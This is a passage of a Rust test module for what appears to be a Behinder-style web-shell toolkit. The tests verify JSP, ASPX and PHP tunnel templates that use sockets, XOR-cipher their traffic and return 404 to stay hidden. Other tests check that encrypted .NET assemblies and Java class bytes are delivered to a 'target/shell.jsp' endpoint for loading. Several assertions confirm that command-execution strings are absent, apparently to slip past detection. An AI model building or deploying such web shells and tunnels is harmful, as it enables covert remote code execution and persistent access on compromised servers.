            .trim_start_matches("$k=base64_decode('")
            .trim_end_matches("');");
        assert_eq!(b64_decode(literal).map(|bytes| bytes.len()), Some(16));
        // Command-execution signatures absent: the tunnel only forwards.
        assert!(!template.contains("system("));
        assert!(!template.contains("exec("));
        assert!(!template.contains("shell_exec"));
    }

    #[test]
    fn jsp_tunnel_template_sockets_and_ciphers() {
        let derived = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-PJAX".into(),
            header_value: "on".into(),
        }
        .derive();
        let template = jsp_tunnel_template(&derived);
        assert!(template.contains("new Socket()"));
        assert!(template.contains("InetSocketAddress"));
        assert!(template.contains('^'));
        assert!(template.contains("sendError(404)"));
        assert!(!template.contains("Runtime"));
        assert!(!template.contains("system("));
    }

    #[test]
    fn aspx_tunnel_template_sockets_and_ciphers() {
        let derived = ChannelConfig {
            key: "k".into(),
            pass: "p".into(),
            header_name: "X-PJAX".into(),
            header_value: "on".into(),
        }
        .derive();
        let template = aspx_tunnel_template(&derived);
        assert!(template.contains("TcpClient"));
        assert!(template.contains("GetStream()"));
        assert!(template.contains('^'));
        assert!(template.contains("StatusCode=404"));
        assert!(!template.contains("Process.Start"));
        assert!(!template.contains("system("));
    }

    #[test]
    fn dotnet_behinder_wraps_assembly_bytes() {
        let md5_key = derive_md5_key("dn-key");
        // A PE-like assembly blob.
        let assembly: Vec<u8> = [0x4du8, 0x5a, 0x90, 0x00]
            .iter()
            .copied()
            .chain([0u8; 60])
            .collect();
        let payload = crate::runtime::DotnetAssemblyPayload {
            assembly_bytes: assembly.clone(),
            entry_class: "Entry".into(),
        };
        let body = payload.wrap(&md5_key);
        assert!(
            !body.contains('M') || !body.starts_with("MZ"),
            "wire body is ciphertext"
        );
        // Roundtrip: decode the endpoint's decrypt path.
        let decoded = b64_decode(&body).unwrap();
        let plain = stream_cipher(&decoded, &md5_key);
        assert_eq!(plain, assembly);
        let template = crate::runtime::aspx_behinder_template(&md5_key);
        assert!(template.contains("Assembly.Load"));
        assert!(template.contains("CreateInstance"));
        assert!(template.contains("StreamReader(Request.InputStream)"));
        assert!(!template.contains("system("));
    }

    #[test]
    fn behinder_face_wraps_class_bytes_as_body() {
        let md5_key = derive_md5_key("behinder-key");
        let channel = BehinderChannel {
            header_name: "Content-Type".into(),
            header_value: "application/json".into(),
            md5_key: md5_key.clone(),
        };
        let class_bytes = b"\xca\xfe\xba\xbe\x00\x00\x00\x34";
        let req = channel
            .drive("http://target/shell.jsp", class_bytes)
            .unwrap();
        assert!(
            req.pass.is_empty(),
            "behinder: no parameter — the body IS the payload"
        );
        assert!(!req.body.contains('\u{ca}')); // ciphertext
        let unwrapped = behinder_unwrap(&req.body, &md5_key).unwrap();
        assert!(unwrapped.starts_with(&[0xca, 0xfe, 0xba, 0xbe])); // roundtrip to class head
    }
}
